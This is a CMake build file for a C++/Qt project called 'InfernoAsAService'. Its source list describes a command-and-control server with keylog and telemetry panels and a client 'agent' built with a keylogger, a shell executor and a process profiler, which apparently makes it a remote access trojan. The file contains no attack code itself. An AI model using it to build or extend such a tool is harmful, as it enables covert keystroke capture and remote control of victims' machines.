cmake_minimum_required(VERSION 3.15)
project(InfernoAsAService VERSION 1.0.0 LANGUAGES CXX)

# ==========================================
# 1. Global Compiler Configurations
# ==========================================
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)
if(MSVC)
    add_compile_options(/W4 /WX)
    add_compile_definitions(NOMINMAX)
else()
    add_compile_options(-Wall -Wextra -Wpedantic -Werror)
endif()

# ==========================================
# 2. OpenSSL (Circle 8 — Transport Security)
# ==========================================
find_package(OpenSSL REQUIRED)

# ==========================================
# 3. Qt Dependencies (Circle 4)
# ==========================================
set(CMAKE_AUTOMOC ON)
set(CMAKE_AUTORCC ON)
set(CMAKE_AUTOUIC ON)

find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui Sql)

# ==========================================
# 2. Common Library (Networking & Protocol)
# ==========================================
add_library(inferno_common STATIC
    common/src/Socket.cpp
    common/src/Packet.cpp
    common/src/CryptoContext.cpp
)
target_include_directories(inferno_common PUBLIC common/include)
target_link_libraries(inferno_common PUBLIC OpenSSL::Crypto)

# ==========================================
# 3. Server Executable
# ==========================================
add_executable(inferno_server
    server/src/main.cpp
    server/src/network/server.cpp
    server/src/ui/MainWindow.cpp
    server/src/ui/components/AgentCardDialog.cpp
    server/src/ui/components/CommandDialog.cpp
    server/src/ui/components/DataStreamWidget.cpp
    server/src/ui/components/TelemetryPanel.cpp
    server/src/ui/components/KeylogPanel.cpp
    server/src/ui/components/IntelligencePanel.cpp
    server/src/database/Inferno_Database.cpp
    server/src/services/Analysis.cpp
    server/src/services/IntelAnalysisService.cpp
    server/include/network/server.hpp
    server/include/ui/MainWindow.hpp
    server/include/ui/StyleSheets.hpp
    server/include/ui/components/DataStreamWidget.hpp
    server/include/ui/components/CommandDialog.hpp
    server/include/ui/components/AgentCardDialog.hpp
    server/include/ui/components/TelemetryPanel.hpp
    server/include/ui/components/KeylogPanel.hpp
    server/include/ui/components/IntelligencePanel.hpp
    server/include/database/Inferno_Database.hpp
    server/include/services/Analysis.hpp
    server/include/services/IntelAnalysisService.hpp
    server/resources/styles.qrc
)
target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
if(WIN32)
    target_link_libraries(inferno_server PRIVATE ws2_32)
endif()

# ==========================================
# 4. Client Agent Executable 
# ==========================================
add_executable(inferno_client
    client/src/main.cpp
    client/src/Agent.cpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
)
target_link_libraries(inferno_client PRIVATE inferno_common)

if(APPLE)
    find_library(CORE_GRAPHICS CoreGraphics)
    find_library(CARBON Carbon)
    find_library(IO_KIT IOKit)
    find_library(CORE_FOUNDATION CoreFoundation)
    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
endif()

if(WIN32)
    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32)
endif()

# ==========================================
# 5. TDD Infrastructure
# ==========================================
enable_testing()
add_executable(inferno_tests
    tests/main_test.cpp
    tests/socket_test.cpp
    tests/server_test.cpp
    tests/packet_test.cpp
    tests/shell_test.cpp
    tests/keylogger_test.cpp
    tests/database_test.cpp
    tests/analysis_test.cpp
    tests/process_profiler_test.cpp
    server/src/network/server.cpp
    server/src/database/Inferno_Database.cpp
    server/src/services/Analysis.cpp
    server/include/database/Inferno_Database.hpp
    server/include/network/server.hpp
    server/include/services/Analysis.hpp
    client/src/ProcessProfiler.cpp
    client/src/ShellExecutor.cpp
    client/src/KeyLogger.cpp
)
target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)

if(APPLE)
    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
endif()

if(WIN32)
    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
endif()

add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
